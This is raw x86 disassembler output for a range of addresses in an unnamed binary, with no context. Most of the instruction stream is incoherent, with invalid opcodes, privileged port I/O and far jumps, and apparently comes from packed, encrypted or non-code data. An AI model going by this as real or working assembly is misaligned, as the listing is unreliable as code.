  4237f4:	mov    edi,0xde7f971
  4237f9:	or     al,0x9f
  4237fb:	outs   dx,DWORD PTR ds:[esi]
  4237fc:	jp     0x42383e
  4237fe:	or     esi,edx
  423800:	jno    0x4237d9
  423802:	inc    eax
  423803:	bound  eax,QWORD PTR [edi-0x6fb84452]
  423809:	(bad)  
  42380a:	pop    ds
  42380b:	or     eax,0xc02653f6
  423810:	lods   eax,DWORD PTR ds:[esi]
  423811:	jl     0x4237a5
  423813:	rol    DWORD PTR [esi+0x7d],cl
  423816:	fldcw  WORD PTR [edx-0x19]
  423819:	adc    esi,DWORD PTR [esi-0x7306e7dd]
  42381f:	lahf   
  423820:	test   al,0x8
  423822:	pop    edx
  423823:	xor    DWORD PTR [esi+0x3da75a39],edx
  423829:	push   edi
  42382a:	imul   eax,DWORD PTR [eax+0x36e4f124],0xfc3f0b05
  423834:	int    0x2a
  423836:	mov    dl,0x21
  423838:	xchg   edi,eax
  423839:	add    DWORD PTR [eax+0x7e],0x62
  42383d:	sbb    dl,BYTE PTR [ebx+0x2a]
  423840:	dec    edx
  423841:	adc    al,0x8e
  423843:	rol    al,0x80
  423846:	mov    ecx,0x77bbcd0a
  42384b:	pop    ebp
  42384c:	push   0xffffffbb
  42384e:	rol    DWORD PTR [ebx+0x558ba077],0x3a
  423855:	fs dec ebx
  423857:	mov    cl,BYTE PTR [esi+0x90cd6c3]
  42385d:	fstp   DWORD PTR [esi]
  42385f:	out    dx,al
  423860:	fst    st(0)
  423862:	cmp    al,0xe6
  423864:	push   DWORD PTR [edx+0x27]
  423867:	je     0x423897
  423869:	or     eax,0x6fc18805
  42386e:	mov    ds:0x89087d6a,eax
  423873:	aam    0x4a
  423875:	push   esp
  423876:	out    0x26,al
  423878:	adc    esi,0x99336d7a
  42387e:	jp     0x4238d6
  423880:	xchg   BYTE PTR [ecx-0x66],dh
  423883:	push   cs
  423884:	mov    ebx,0x3f97d37a
  423889:	sti    
  42388a:	mov    BYTE PTR [edi+0x3c0770a0],bh
  423890:	cmp    eax,edx
  423892:	and    BYTE PTR [esp+ebp*2-0x53],0x3d
  423897:	pushf  
  423898:	ins    DWORD PTR es:[edi],dx
  423899:	xchg   ebp,eax
  42389a:	ja     0x42382d
  42389c:	(bad)  
  42389d:	out    dx,eax
  42389e:	test   eax,0xef469ade
  4238a3:	push   ss
  4238a4:	loop   0x42385f
  4238a6:	out    0x97,al
  4238a8:	shl    BYTE PTR [ebx],cl
  4238aa:	sbb    eax,0xaaba0856
  4238af:	push   ebp
  4238b0:	sub    eax,edx
  4238b2:	fsubr  QWORD PTR [edi-0x4cdf6ea]
  4238b8:	fstp   TBYTE PTR [edi+0x1bdf0b41]
  4238be:	out    0xca,eax
  4238c0:	loope  0x423938
  4238c2:	mov    ds:0x2ad756bd,eax
  4238c7:	arpl   di,ax
  4238c9:	jbe    0x4238b4
  4238cb:	mov    eax,ds:0x7fbba190
  4238d0:	repnz mov ds:0x3488a705,al
  4238d6:	jg     0x4238da
  4238d8:	adc    al,0x55
  4238da:	xchg   ecx,eax
  4238db:	pop    esp
  4238dc:	cmp    DWORD PTR [ebp+0x11],ecx
  4238df:	jo     0x423958
  4238e1:	loop   0x4238a5
  4238e3:	out    0xf3,al
  4238e5:	or     BYTE PTR [esi+0x39],bh
  4238e8:	push   0xcf1d02b1
  4238ed:	push   esi
  4238ee:	adc    eax,0x7dbee58e
  4238f3:	data16 aas 
  4238f5:	mov    ds:0x0,eax
	...
  42393a:	add    BYTE PTR [eax],al
  42393c:	aad    0x80
  42393e:	pusha  
  42393f:	cld    
  423940:	jne    0x42393e
  423942:	(bad)  [ecx+0x32bc8e94]
  423948:	jp     0x423975
  42394a:	mov    edi,0x121b35f
  42394f:	add    BYTE PTR [edx],ah
  423951:	pop    es
  423952:	add    BYTE PTR [eax],al
  423954:	inc    ebp
  423955:	xchg   ebx,eax
  423956:	pop    es
  423957:	mov    DWORD PTR [eax],esp
  423959:	lahf   
  42395a:	les    ebp,FWORD PTR [ebx]
  42395c:	fsub   DWORD PTR [esp+ebp*8-0x63790aaa]
  423963:	inc    ebx
  423964:	dec    edi
  423965:	dec    edx
  423966:	lods   eax,DWORD PTR cs:[esi]
  423968:	and    bl,BYTE PTR [ecx+0x50]
  42396b:	adc    bh,0xee
  42396e:	test   DWORD PTR [esi+ebx*2+0x56c360b8],ebx
  423975:	xchg   esi,eax
  423976:	in     eax,0x1a
  423978:	add    al,0x22
  42397a:	jle    0x4238fd
  42397c:	pop    cx
  42397e:	fcomip st,st(3)
  423980:	or     DWORD PTR [edi-0x553ba747],ebx
  423986:	(bad)  
  423987:	std    
  423988:	sub    eax,0x97bd0932
  42398d:	sbb    bh,BYTE PTR [ebx+edx*1]
  423990:	inc    esi
  423991:	xor    eax,0x6b116bdb
  423996:	leave  
  423997:	sti    
  423998:	and    eax,0x8beca078
  42399d:	in     al,0x3a
  42399f:	sub    ah,dl
  4239a1:	les    edi,FWORD PTR ds:0xfbfe1c5c
  4239a7:	hlt    
  4239a8:	inc    eax
  4239a9:	retf   
  4239aa:	sub    BYTE PTR [edx],bh
  4239ac:	mov    ch,0x4e
  4239ae:	lods   al,BYTE PTR ds:[esi]
  4239af:	inc    ebp
  4239b0:	shl    DWORD PTR [esi],0xc4
  4239b3:	setge  BYTE PTR [edi+ebx*4]
  4239b7:	sbb    ah,ch
  4239b9:	xchg   edi,eax
  4239ba:	mov    edi,0x2f4bd92a
  4239bf:	rcr    DWORD PTR [esp+esi*2],1
  4239c2:	addr16 mov ecx,0xc7dacaa6
  4239c8:	(bad)  
  4239c9:	jnp    0x423a27
  4239cb:	jge    0x4239ef
  4239cd:	outs   dx,BYTE PTR ds:[esi]
  4239ce:	mov    ch,0x41
  4239d0:	xlat   BYTE PTR ds:[ebx]
  4239d1:	jmp    0x42399c
  4239d3:	sbb    eax,0xfefacddb
  4239d8:	ret    0x175d
  4239db:	jp     0x423a23
  4239dd:	jmp    0x423a58
  4239df:	pop    eax
  4239e0:	les    edi,FWORD PTR [edx-0x33]
  4239e3:	gs pop eax
  4239e5:	arpl   WORD PTR [ebp+0x60dccaa6],dx
  4239eb:	add    esp,0x69
  4239ee:	push   ebx
  4239f0:	lods   eax,DWORD PTR ds:[esi]
  4239f1:	push   ebx
  4239f2:	adc    bh,BYTE PTR [ecx-0x6d]
  4239f5:	xchg   ebx,eax
  4239f6:	mov    cl,0x88
  4239f8:	mov    WORD PTR [edi],gs
  4239fa:	push   ds
  4239fb:	rcr    ah,1
  4239fd:	mov    BYTE PTR [ecx],0xcf
  423a00:	jge    0x4239ff
  423a02:	gs test al,0x9a
  423a05:	ret    0xce6d
  423a08:	loop   0x423a7f
  423a0a:	retf   
  423a0b:	mov    al,0xe5
  423a0d:	mov    ecx,0x26c22d78
  423a12:	nop
  423a13:	or     ebp,DWORD PTR [edx+0x5d]
  423a16:	stos   DWORD PTR es:[edi],eax
  423a17:	add    eax,0x9f8fed19
  423a1c:	(bad)  
  423a1e:	mov    ebp,DWORD PTR [ebx+0x28edb8c2]
  423a24:	adc    DWORD PTR [eax],0x37
  423a27:	bound  ecx,QWORD PTR [ebx+0x46]
  423a2a:	sar    BYTE PTR [eax-0x7d70ff9c],cl
  423a30:	add    ch,BYTE PTR [edx-0x24]
  423a33:	aad    0xc5
  423a35:	lock or bl,0xf1
  423a39:	fld    DWORD PTR [edx-0x20]
  423a3c:	into   
  423a3d:	(bad)  
  423a3f:	dec    esp
  423a40:	fsub   DWORD PTR [esi-0xc]
  423a43:	fidivr DWORD PTR [ecx-0xaf4c60c]
  423a49:	pop    ds
  423a4a:	fucomp st(3)
  423a4c:	mov    esi,ecx
  423a4e:	call   0x636656cc
  423a53:	leave  
  423a54:	pop    es
  423a55:	loop   0x423a07
  423a57:	pushf  
  423a58:	bound  esi,QWORD PTR [eax+0x37]
  423a5b:	imul   ebp,DWORD PTR [ebp+0xe],0x60
  423a5f:	mov    WORD PTR [ebx+0x30],?
  423a62:	mov    esi,0xdfce7531
  423a67:	sar    DWORD PTR [edx-0x709d00f0],0x76
  423a6e:	sub    BYTE PTR [ebp+0x2eb8004a],bl
  423a74:	pop    edi
  423a75:	cmp    eax,DWORD PTR [edi+0x64]
  423a78:	mov    ch,0x8a
  423a7a:	and    DWORD PTR [eax-0x70115363],0x3e
  423a81:	dec    eax
  423a82:	push   ecx
  423a83:	xchg   ecx,eax
  423a84:	or     edx,DWORD PTR [ebx]
  423a86:	push   ds
  423a87:	cmp    esi,DWORD PTR [esp+0x644d2751]
  423a8e:	jmp    0xb8e77854
  423a93:	sti    
  423a94:	push   cs
  423a95:	ret    
  423a96:	jnp    0x423aa8
  423a98:	mov    al,0xe2
  423a9a:	or     esi,ecx
  423a9c:	pushf  
  423a9d:	out    0x29,al
  423a9f:	push   eax
  423aa0:	jle    0x423a29
  423aa2:	mov    eax,ds:0x7d5daec6
  423aa7:	push   ss
  423aa8:	mov    al,0xb0
  423aaa:	retf   0x3dc
  423aad:	pop    ss
  423aae:	adc    DWORD PTR [ecx+0x6aaf07b7],edi
  423ab4:	mov    bl,0xfd
  423ab6:	ja     0x423b12
  423ab8:	and    DWORD PTR [edi],esi
  423aba:	or     esp,DWORD PTR [edx]
  423abc:	fwait
  423abd:	xchg   ebp,eax
  423abe:	jo     0x423add
  423ac0:	sbb    esp,DWORD PTR es:[edx+0x44]
  423ac4:	pop    ecx
  423ac5:	leave  
  423ac6:	bound  ebx,QWORD PTR [esp+edi*8+0x36]
  423aca:	pop    edx
  423acb:	loop   0x423b23
  423acd:	dec    ebp
  423ace:	and    al,0xd4
  423ad0:	inc    ebx
  423ad1:	sbb    edx,DWORD PTR [ebx]
  423ad3:	jp     0x423b41
  423ad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423ad6:	mov    ch,0x3c
  423ad8:	mov    ecx,0xdbfb0eb8
  423add:	fwait
  423ade:	inc    esi
  423adf:	push   eax
  423ae0:	jns    0x423b4b
  423ae2:	pop    esp
  423ae3:	aam    0xb2
  423ae5:	xchg   BYTE PTR [edi-0x2e552e02],bh
  423aeb:	cmc    
  423aec:	rol    ch,0x8c
  423aef:	das    
  423af0:	outs   dx,BYTE PTR ds:[esi]
  423af1:	stos   BYTE PTR es:[edi],al
  423af2:	pop    ecx
  423af3:	add    al,0xf2
  423af5:	mov    dl,0x0
  423af7:	mov    esp,?
  423af9:	sub    al,0x7b
  423afb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423afc:	stos   BYTE PTR es:[edi],al
  423afd:	jmp    0x9311:0x92d3256c
  423b04:	cmc    
  423b05:	xchg   DWORD PTR [edi+0x3],ebp
  423b08:	pop    ecx
  423b09:	jp     0x423aab
  423b0b:	rcl    BYTE PTR [edi],0x20
  423b0e:	push   ebx
  423b0f:	mov    dl,0x9e
  423b11:	pop    esp
  423b12:	not    ah
  423b14:	cmp    DWORD PTR [edi-0x5f],eax
  423b17:	retf   
  423b18:	bound  ebx,QWORD PTR [eax+0x5e6b3eb4]
  423b1e:	cmp    eax,0x4e8a18ba
  423b23:	je     0x423b49
  423b25:	cld    
  423b26:	pop    esi
  423b27:	push   esi
  423b28:	push   0xf78b3830
  423b2d:	jp     0x423b20
  423b2f:	das    
  423b30:	shl    esi,0x6b
  423b33:	xchg   edi,eax
  423b34:	sub    esi,esp
  423b36:	adc    esi,DWORD PTR [ebp-0x66366de6]
  423b3c:	or     DWORD PTR [edi+ebx*1],ebx
  423b3f:	imul   esi,DWORD PTR [eax+0x31ab8321],0x40
  423b46:	inc    ebp
  423b47:	loopne 0x423b80
  423b49:	pop    ss
  423b4a:	stos   BYTE PTR es:[edi],al
  423b4b:	out    0x47,al
  423b4d:	lds    edi,FWORD PTR [eax]
  423b4f:	sar    BYTE PTR [ecx-0x3a],1
  423b52:	cmp    BYTE PTR [ecx],al
  423b54:	push   esi
  423b55:	rol    BYTE PTR [ebx],cl
  423b57:	popa   
  423b58:	fild   QWORD PTR [edx]
  423b5a:	out    dx,al
  423b5b:	push   esi
  423b5c:	add    ah,BYTE PTR [ecx+ecx*1-0x3c]
  423b60:	mul    BYTE PTR [eax]
  423b62:	jne    0x423b5f
  423b64:	xor    DWORD PTR [ebp-0x2],ecx
  423b67:	shl    edx,cl
  423b69:	xchg   edx,eax
  423b6a:	out    dx,eax
  423b6b:	add    BYTE PTR [edi],al
  423b6d:	jle    0x423ba2
  423b6f:	add    al,BYTE PTR [esi]
  423b71:	scas   eax,DWORD PTR es:[edi]
  423b72:	shr    BYTE PTR [ebx],1
  423b74:	xchg   edi,eax
  423b75:	jmp    0x423bac
  423b77:	pop    edi
  423b78:	jecxz  0x423bd3
  423b7a:	lahf   
  423b7b:	mov    ch,0xa6
  423b7d:	cli    
  423b7e:	addr16 pop ebx
  423b80:	dec    esi
  423b81:	jb     0x423b9e
  423b83:	push   ss
  423b84:	out    0x4c,al
  423b86:	loop   0x423bde
  423b88:	push   ecx
  423b89:	mov    eax,0x79824512
  423b8e:	pop    ebx
  423b8f:	ret    0x16da
  423b92:	cwde   
  423b93:	mov    bh,0xfd
  423b95:	loopne 0x423b82
  423b97:	pushf  
  423b98:	les    ecx,FWORD PTR [edx+0xf]
  423b9b:	dec    edi
  423b9c:	sbb    esi,DWORD PTR [ecx+ecx*8-0x42]
  423ba0:	pop    ebx
  423ba1:	adc    al,0x94
  423ba3:	jp     0x423c0f
  423ba5:	mov    dh,0xf1
  423ba7:	push   ebx
  423ba8:	mov    ecx,DWORD PTR [eax+eax*2-0x50]
  423bac:	out    0xe0,al
  423bae:	ins    DWORD PTR es:[edi],dx
  423baf:	inc    edi
  423bb0:	and    eax,0xa0fa9e9a
  423bb5:	not    DWORD PTR [edx]
  423bb7:	inc    esi
  423bb8:	push   cs
  423bb9:	ins    DWORD PTR es:[edi],dx
  423bba:	in     al,0xe4
  423bbc:	cmp    DWORD PTR [ebx+0x6a],eax
  423bbf:	sbb    al,BYTE PTR [ecx+0x455f7d22]
  423bc5:	shr    BYTE PTR [ebp+0x26],0x5d
  423bc9:	xchg   ecx,eax
  423bca:	mov    ds:0xd5676bdd,al
  423bcf:	lock lds ebp,FWORD PTR [esi]
  423bd2:	mov    esi,0xbdafafa9
  423bd7:	pop    es
  423bd8:	cmp    esp,DWORD PTR [edi+0x2a]
  423bdb:	add    eax,0x1af8d09f
  423be0:	mov    ah,0x59
  423be2:	sbb    al,0x88
  423be4:	push   ebx
  423be5:	iret   
  423be6:	loop   0x423b90
  423be8:	pop    eax
  423be9:	inc    esi
  423bea:	das    
  423beb:	bound  esi,QWORD PTR [ecx]
  423bed:	arpl   si,dx
  423bef:	push   0x6ee04dbd
  423bf4:	mov    ds:0x34970be3,eax
  423bf9:	dec    edx
  423bfa:	mov    BYTE PTR [ebx+edx*4],dl
  423bfd:	adc    al,0x3b
  423bff:	aas    
  423c00:	pop    ds
  423c01:	push   ss
  423c02:	adc    dl,BYTE PTR [esi+ecx*1-0x9]
  423c06:	outs   dx,DWORD PTR ds:[esi]
  423c07:	ins    BYTE PTR es:[edi],dx
  423c08:	mov    esp,0x8abfaa09
  423c0d:	adc    esi,DWORD PTR [edi-0x48a621ce]
  423c13:	or     BYTE PTR [ebx-0x21],0xd3
  423c17:	xchg   esi,eax
  423c18:	add    dh,BYTE PTR [eax]
  423c1a:	pop    edx
  423c1b:	mov    dl,0xba
  423c1d:	push   ds
  423c1e:	add    DWORD PTR [edi],esp
  423c20:	in     al,dx
  423c21:	xor    ah,BYTE PTR [ecx+0x4ee46797]
  423c27:	pop    edi
  423c28:	jmp    0x423c61
  423c2a:	jmp    0x423c29
  423c2c:	arpl   WORD PTR [ecx],bp
  423c2e:	xchg   edi,eax
  423c2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423c30:	lock outs dx,DWORD PTR ds:[esi]
  423c32:	jne    0x423c0d
  423c34:	iret   
  423c35:	add    BYTE PTR [ecx+0x2b13f444],cl
  423c3b:	aaa    
  423c3c:	lea    ebp,[edx]
  423c3e:	sbb    eax,0xd37c9c8d
  423c43:	adc    al,0xb9
  423c45:	mov    al,ds:0x7e86f6bf
  423c4a:	sub    DWORD PTR [ebx],ebx
  423c4c:	jmp    0x423cca
  423c4e:	jb     0x423cb3
  423c50:	not    cl
  423c52:	cmp    BYTE PTR ds:0xf5d9fd4d,dh
  423c58:	or     BYTE PTR [edx+0x34621feb],cl
  423c5e:	adc    eax,0x617cc627
  423c63:	outs   dx,BYTE PTR ds:[esi]
  423c64:	mov    dx,0x3d41
  423c68:	mov    ebx,0x5927cc5b
  423c6d:	dec    edi
  423c6e:	sbb    BYTE PTR [edx-0x76],0x69
  423c72:	nop
  423c73:	dec    ecx
  423c74:	test   eax,0xbf6817b4
  423c79:	cwde   
  423c7a:	inc    edx
  423c7b:	shl    BYTE PTR [esi],1
  423c7d:	popf   
  423c7e:	pop    esi
  423c7f:	outs   dx,DWORD PTR ds:[esi]
  423c80:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  423c82:	sub    BYTE PTR [eax+0x5310770c],bl
  423c88:	cdq    
  423c89:	cld    
  423c8a:	hlt    
  423c8b:	loope  0x423c65
  423c8d:	aaa    
  423c8e:	and    eax,0x49e004f7
  423c93:	fistp  DWORD PTR [eax]
  423c95:	mov    ecx,DWORD PTR [esi+0x29]
  423c98:	xchg   BYTE PTR [ebp+0x0],bl
  423c9b:	imul   DWORD PTR [esi+0x783cd01b]
  423ca1:	jecxz  0x423cc5
  423ca3:	adc    bl,cl
  423ca5:	sub    esi,DWORD PTR [eax+0x60]
  423ca8:	mov    esp,0x27adcf9c
  423cad:	mov    DWORD PTR [ecx],ebx
  423caf:	mov    ah,0xf
  423cb1:	xlat   BYTE PTR ds:[ebx]
  423cb2:	pop    ss
  423cb3:	sub    ecx,DWORD PTR [esi+0x4e]
  423cb6:	out    dx,al
  423cb7:	xchg   esp,eax
  423cb8:	inc    ecx
  423cb9:	sub    DWORD PTR [edi-0x6e1996f2],ebx
  423cbf:	loop   0x423cae
  423cc1:	pop    eax
  423cc2:	jns    0x423d09
  423cc4:	mov    bl,0xa2
  423cc6:	xchg   edx,eax
  423cc7:	popa   
  423cc8:	dec    ebx
  423cc9:	fdecstp 
  423ccb:	add    cl,ah
  423ccd:	ja     0x423cec
  423ccf:	aaa    
  423cd0:	in     al,dx
  423cd1:	xchg   edi,eax
  423cd2:	fwait
  423cd3:	test   ebx,esi
  423cd5:	cdq    
  423cd6:	mov    ss,WORD PTR [eax+ebx*2]
  423cd9:	mov    al,ds:0xe23c0f79
  423cde:	push   ebx
  423cdf:	ja     0x423d1c
  423ce1:	dec    ebp
  423ce2:	dec    edi
  423ce3:	xchg   DWORD PTR [esi+0x26e72da0],edx
  423ce9:	mov    esi,0xd176da06
  423cee:	or     al,0x10
  423cf0:	lods   al,BYTE PTR ds:[esi]
  423cf1:	push   ebp
  423cf2:	jae    0x423c78
  423cf4:	outs   dx,BYTE PTR ds:[esi]
  423cf5:	pop    ebp
  423cf6:	adc    al,0xc2
  423cf8:	sbb    ch,BYTE PTR [edx-0x73c25e2b]
  423cfe:	mov    BYTE PTR [ebp-0x26],ah
  423d01:	cs pop edx
  423d03:	cld    
  423d04:	in     eax,0xaa
  423d06:	jnp    0x423ce6
  423d08:	js     0x423d00
  423d0a:	mov    al,ds:0xf05af41a
  423d0f:	dec    eax
  423d10:	imul   eax,ecx,0xffffffb0
  423d13:	jle    0x423cec
  423d15:	mov    eax,0x3b66b8a
  423d1a:	or     al,0x69
  423d1c:	fstp   QWORD PTR [edi]
  423d1e:	je     0x423d4d
  423d20:	sub    eax,DWORD PTR ds:0xc1a7897a
  423d26:	push   0xffffffd2
  423d28:	sbb    edi,eax
  423d2a:	je     0x423cbe
  423d2c:	mov    ecx,DWORD PTR [edx]
  423d2e:	mov    ds:0x8ca1ef88,al
  423d33:	xor    esp,edi
  423d35:	daa    
  423d36:	cwde   
  423d37:	pop    ebx
  423d38:	sbb    edx,DWORD PTR [ebx+0x1e180f41]
  423d3e:	pop    ebp
  423d3f:	pop    es
  423d40:	or     eax,0xd513b5ba
  423d45:	pop    esi
  423d46:	lods   eax,DWORD PTR ds:[esi]
  423d47:	mov    dh,0x5a
  423d49:	jg     0x423d9d
  423d4b:	pop    eax
  423d4c:	adc    al,BYTE PTR [esi+0x3f]
  423d4f:	xchg   ebp,eax
  423d50:	pop    esp
  423d51:	mov    eax,ds:0xd22e76de
  423d56:	or     dl,cl
  423d58:	inc    ebp
  423d59:	(bad)  
  423d5a:	jb     0x423d70
  423d5c:	xchg   esi,eax
  423d5d:	es add dl,bl
  423d60:	repz dec esi
  423d62:	lea    esp,fs:[ebx+0x14]
  423d66:	inc    ebp
  423d67:	pop    edx
  423d68:	cmp    BYTE PTR [ecx],bh
  423d6a:	loop   0x423d18
  423d6c:	sti    
  423d6d:	mov    DWORD PTR [edi],eax
  423d6f:	nop
  423d70:	mov    edi,0xbf498aa2
  423d75:	test   eax,0x62552f55
  423d7a:	push   ss
  423d7b:	and    eax,0x70ede705
  423d80:	xchg   ecx,eax
  423d81:	adc    edi,DWORD PTR [edi]
  423d83:	inc    ebx
  423d84:	and    al,0x5a
  423d86:	and    eax,0x49d0d375
  423d8b:	stos   BYTE PTR es:[edi],al
  423d8c:	cwde   
  423d8d:	loopne 0x423dff
  423d8f:	aaa    
  423d90:	test   eax,0xa7c74d7
  423d95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423d96:	ds and dl,bh
  423d99:	add    al,0x77
  423d9b:	outs   dx,DWORD PTR ds:[esi]
  423d9c:	in     eax,0xf1
  423d9e:	das    
  423d9f:	(bad)  
  423da1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423da2:	call   0xf175:0xa0115c07
  423da9:	pop    ebx
  423daa:	mov    al,0xcb
  423dac:	popa   
  423dad:	fidiv  WORD PTR [edi-0x3e6ae8e3]
  423db3:	js     0x423e08
  423db5:	(bad)  
  423db6:	dec    edi
  423db7:	sti    
  423db8:	jmp    0x76f4:0x7e1099b7
  423dbf:	sub    eax,0x7eb59895
  423dc4:	mov    ds:0xe0c627ef,al
  423dc9:	mov    ds:0x6b05a30,al
  423dce:	icebp  
  423dcf:	(bad)  
  423dd0:	call   0xe90a203a
  423dd5:	sbb    ch,bl
  423dd7:	call   FWORD PTR [ebx+0x1c810da4]
  423ddd:	lahf   
  423dde:	inc    esp
  423ddf:	data16 (bad) 
  423de1:	mov    ch,0x85
  423de3:	ret    
  423de4:	imul   edx,edi,0x3d26db23
  423dea:	sub    edi,DWORD PTR [edi+0x6b101ea0]
  423df0:	jl     0x423db6
  423df2:	sbb    DWORD PTR ds:0x74f36efc,ebx
  423df8:	cmp    DWORD PTR [eax+0x28ed741e],esp
  423dfe:	pop    ecx
  423dff:	push   ebx
  423e00:	push   cs
  423e01:	push   esi
  423e02:	and    BYTE PTR [ebp+0x4f],al
  423e05:	push   cs
  423e06:	retf   
  423e07:	and    ebx,DWORD PTR [esi-0x76]
  423e0a:	repnz mov edi,0x6f6f1d66
  423e10:	and    al,0x67
  423e12:	mov    esp,0xcf749f81
  423e17:	adc    bl,BYTE PTR [esi+0x2f1fbfd]
  423e1d:	sub    edx,DWORD PTR [edi-0x1f]
  423e20:	or     esi,edx
  423e22:	dec    ebp
  423e23:	lds    ebp,FWORD PTR [ecx-0x1b2d29fd]
  423e29:	sahf   
  423e2a:	fdivr  st(7),st
  423e2c:	mov    dh,0x71
  423e2e:	stc    
  423e2f:	outs   dx,BYTE PTR ds:[esi]
  423e30:	xor    BYTE PTR [esi+0x2c4dedf5],al
  423e36:	jle    0x423e08
  423e38:	dec    esi
  423e39:	loope  0x423e06
  423e3b:	xor    al,0x98
  423e3d:	loope  0x423df5
  423e3f:	pop    ecx
  423e40:	sbb    DWORD PTR [ecx+eax*2+0x35cf9388],edi
  423e47:	jmp    0x423e5c
  423e49:	rol    ah,cl
  423e4b:	stos   DWORD PTR es:[edi],eax
  423e4c:	call   0xfcb9e86f
  423e51:	pusha  
  423e52:	mov    ds:0xa757b544,al
  423e57:	outs   dx,DWORD PTR ds:[esi]
  423e58:	jns    0x423e7e
  423e5a:	add    bh,bh
  423e5c:	add    DWORD PTR [eax],ebx
  423e5e:	sub    BYTE PTR [eax+ebp*2+0x5e423f17],ah
  423e65:	xor    al,0x21
  423e67:	inc    edi
  423e68:	stc    
  423e69:	out    dx,eax
  423e6a:	jmp    0xdeaf:0x7f15781a
  423e71:	cmp    BYTE PTR [eax],al
  423e73:	sar    dh,cl
  423e75:	mov    al,ds:0xb41e0f91
  423e7a:	mov    eax,ds:0x49b587dc
  423e7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e80:	call   0x12e9:0xf995ecec
  423e87:	pop    eax
  423e88:	(bad)  
  423e8a:	inc    esp
  423e8b:	inc    DWORD PTR [ecx+0x6863ab1]
  423e91:	mov    edx,0x4c775e0e
  423e96:	sub    ah,BYTE PTR [ecx+0x40]
  423e99:	cmc    
  423e9a:	iret   
  423e9b:	popf   
  423e9c:	pop    esi
  423e9d:	mov    BYTE PTR [edx],bh
  423e9f:	cli    
  423ea0:	out    0xd8,eax
  423ea2:	test   BYTE PTR [edx*2+0x12de6f07],dh
  423ea9:	scas   al,BYTE PTR es:[edi]
  423eaa:	sbb    BYTE PTR [edx+eax*2-0x78],0x53
  423eaf:	jmp    0xef55:0xde9198a5
  423eb6:	xor    DWORD PTR [edi+edi*8],edi
  423eb9:	mov    al,ds:0x806b205d
  423ebe:	sahf   
  423ebf:	nop
  423ec0:	popa   
  423ec1:	addr16 int 0xd2
  423ec4:	cmp    al,0xc4
  423ec6:	sub    al,0x59
  423ec8:	jmp    DWORD PTR [ecx+eiz*2+0xed17b50]
  423ecf:	xchg   esi,eax
  423ed0:	pop    edx
  423ed1:	or     al,BYTE PTR [eax+0x4e3a719f]
  423ed7:	cwde   
  423ed8:	dec    eax
  423ed9:	cmp    eax,0x127b741
  423ede:	mov    edx,0xbee400de
  423ee3:	pop    ebp
  423ee4:	jo     0x423f0a
  423ee6:	or     DWORD PTR [eax],ecx
  423ee8:	pop    edi
  423ee9:	div    BYTE PTR [edx+0x7beddfd9]
  423eef:	xor    DWORD PTR [edi+0x51],edi
  423ef2:	mov    edi,0x790ebf97
  423ef7:	mov    bl,BYTE PTR [eax]
  423ef9:	cmc    
  423efa:	leave  
  423efb:	lods   al,BYTE PTR ds:[esi]
  423efc:	xchg   DWORD PTR [ebx+ebp*2-0x58],edi
  423f00:	pop    es
  423f01:	push   ss
  423f02:	sbb    cl,cl
  423f04:	or     DWORD PTR [esi-0x22],ebp
  423f07:	xor    BYTE PTR [eax],dh
  423f09:	mov    edx,DWORD PTR [edi+0x2137c846]
  423f0f:	dec    esp
  423f10:	fadd   st,st(1)
  423f12:	cdq    
  423f13:	pop    ecx
  423f14:	clc    
  423f15:	sub    eax,0x2c663262
  423f1a:	sub    ebp,DWORD PTR [edx+0x71f2110c]
  423f20:	popa   
  423f21:	gs add eax,0xfe0f96b9
  423f27:	inc    eax
  423f28:	or     eax,ebx
  423f2a:	adc    al,0x9b
  423f2c:	inc    BYTE PTR [ebx]
  423f2e:	in     eax,dx
  423f2f:	xlat   BYTE PTR ds:[ebx]
  423f30:	pop    ss
  423f31:	add    ah,BYTE PTR [edi]
  423f33:	jmp    0xbacebcf
  423f38:	xor    BYTE PTR [edx+0x48470183],bl
  423f3e:	jnp    0x423f34
  423f40:	jmp    0x407c1380
  423f45:	mov    fs,edx
  423f47:	pop    edx
  423f48:	adc    esp,edx
  423f4a:	lock dec edx
  423f4c:	cmp    BYTE PTR [edx],cl
  423f4e:	and    ah,BYTE PTR [edi]
  423f50:	mov    dh,0xc4
  423f52:	xor    BYTE PTR [esi],cl
  423f54:	ror    BYTE PTR [esi],cl
  423f56:	inc    ecx
  423f57:	outs   dx,DWORD PTR ds:[esi]
  423f58:	jnp    0x423f2f
  423f5a:	mov    dh,BYTE PTR [esi-0x1c]
  423f5d:	jp     0x423f6f
  423f5f:	sub    eax,0x835a24a5
  423f64:	push   esi
  423f65:	outs   dx,DWORD PTR ds:[esi]
  423f66:	jne    0x423f2c
  423f68:	sub    eax,0x523e5ba
  423f6d:	popa   
  423f6e:	sub    al,0x6a
  423f70:	mov    edi,0x2db0c03f
  423f75:	retf   0x2403
  423f78:	pushf  
  423f79:	ins    DWORD PTR es:[edi],dx
  423f7a:	(bad)  
  423f7c:	hlt    
  423f7d:	cdq    
  423f7e:	fisttp QWORD PTR [ecx]
  423f80:	and    BYTE PTR [eax-0x7d],ah
  423f83:	jge    0x423f9f
  423f85:	lds    esp,FWORD PTR [ecx+eax*4+0x61]
  423f89:	sbb    DWORD PTR [ecx],ebx
  423f8b:	imul   esp,DWORD PTR [edi-0x5218f6d4],0x6928f2a9
  423f95:	or     dh,BYTE PTR [ecx+0x5835364b]
  423f9b:	daa    
  423f9c:	sub    edx,edi
  423f9e:	inc    esi
  423f9f:	push   eax
  423fa0:	inc    esi
  423fa1:	neg    DWORD PTR [ecx]
  423fa3:	dec    edi
  423fa4:	imul   ecx,DWORD PTR [ebp+0x2b7fb6fa],0x684323e
  423fae:	call   0xd0221d62
  423fb3:	fnsave [esi+edi*4-0x53]
  423fb7:	add    al,0xd1
  423fb9:	jnp    0x423f85
  423fbb:	jne    0x424005
  423fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423fbe:	into   
  423fbf:	es stc 
  423fc1:	and    DWORD PTR [esi-0x20],esi
  423fc4:	jbe    0x423fd0
  423fc6:	sbb    eax,0x93ef8716
  423fcb:	jae    0x423f60
  423fcd:	mov    DWORD PTR ds:0x57f2744e,0xc6ccc754
  423fd7:	nop
